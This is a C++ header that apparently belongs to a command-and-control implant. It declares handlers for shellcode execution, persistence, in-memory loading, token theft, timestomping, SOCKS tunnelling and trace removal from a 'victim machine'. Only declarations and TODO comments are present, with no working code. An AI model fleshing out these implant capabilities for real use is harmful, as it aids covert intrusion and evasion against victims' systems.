#ifndef CONTROLLER_H
#define CONTROLLER_H


#include "MessageTypes.h"
#include "MessageHandler.h"


// TODO: 
// https://attack.mitre.org/tactics/enterprise/
class Controller
{
public:
	Controller(MessageHandler* messageHandler, ApiManager* apiManager);
	void handleDefault(const InternalMessage& msg);
	void handleNone(const InternalMessage& msg);

	// TODO: rename to handleExecuteConsoleCommand? 
	void handleExecuteCommand(const InternalMessage& msg);

	void handleExecuteShellcode(const InternalMessage& msg);

	void handleSystemInfo(const InternalMessage& msg);
    void handleListDirectory(const InternalMessage& msg);


	// TODO: make a subclass called PersistenceController?
	void handleEstablishPersistence(const InternalMessage& msg);

	// TODO: load bytes into memory and execute without saving a file to disk
	// TODO: make a subclass called MemLoader or memModule?
	// it can load and unload bytes using a variety of different methods like
	// virtualalloc, writeprocessmemroy, createthread, or reflectived dll loading
	void handleMemLoader(const InternalMessage& msg);

    // Existing file-transfer handlers.
    void handleUpload(const InternalMessage& msg);
    void handleDownload(const InternalMessage& msg);

    // These command placeholders only return ERROR_REPORT; they ignore the payload.
    void handleScreenshot(const InternalMessage& msg);
    void handleCd(const InternalMessage& msg);
    void handleCp(const InternalMessage& msg);
    void handleDrives(const InternalMessage& msg);
    void handleExit(const InternalMessage& msg);
    void handleGetPrivs(const InternalMessage& msg);
    void handleGetUid(const InternalMessage& msg);
    void handleKerberosCcacheUse(const InternalMessage& msg);
    void handleKerberosTicketPurge(const InternalMessage& msg);
    void handleKerberosTicketUse(const InternalMessage& msg);
    void handleJobKill(const InternalMessage& msg);
    void handleKill(const InternalMessage& msg);
    void handleLink(const InternalMessage& msg);
    void handleLs(const InternalMessage& msg);
    void handleMakeToken(const InternalMessage& msg);
    void handleMkdir(const InternalMessage& msg);
    void handleMv(const InternalMessage& msg);
    void handlePpid(const InternalMessage& msg);
    void handlePs(const InternalMessage& msg);
    void handlePwd(const InternalMessage& msg);
    void handleRegQuery(const InternalMessage& msg);
    void handleRegQueryv(const InternalMessage& msg);
    void handleRev2Self(const InternalMessage& msg);
    void handleRm(const InternalMessage& msg);
    void handleRportfwd(const InternalMessage& msg);
    void handleSetEnv(const InternalMessage& msg);
    void handleSocks(const InternalMessage& msg);
    void handleStealToken(const InternalMessage& msg);
    void handleTimeStomp(const InternalMessage& msg);
    void handleUnlink(const InternalMessage& msg);

	// TODO: handles updating config/settings...
	// c2 server addr, beacon interval, jitter, encryption key,
	// user agent string, proxy settings, command execution timeout,
	// which modules are enabled, privelege level to request?, transportLayer type,
	// etc...
	void handleSet(const InternalMessage& msg);

	// TODO: completly remove implant and all traces and child tasks/processes
	// that it created from the victim machine. this includes removing persistence
	void handleUninstall(const InternalMessage& msg);

	// TODO: a predefined task (defined in as a module)?
	// ex., start, stop (kill), pause, 
	void handleTask(const InternalMessage& msg);

private:
    void sendNotImplemented(const InternalMessage& msg, const char* command);

	MessageHandler* messageHandler_;
	ApiManager* apiManager_;

};

#endif
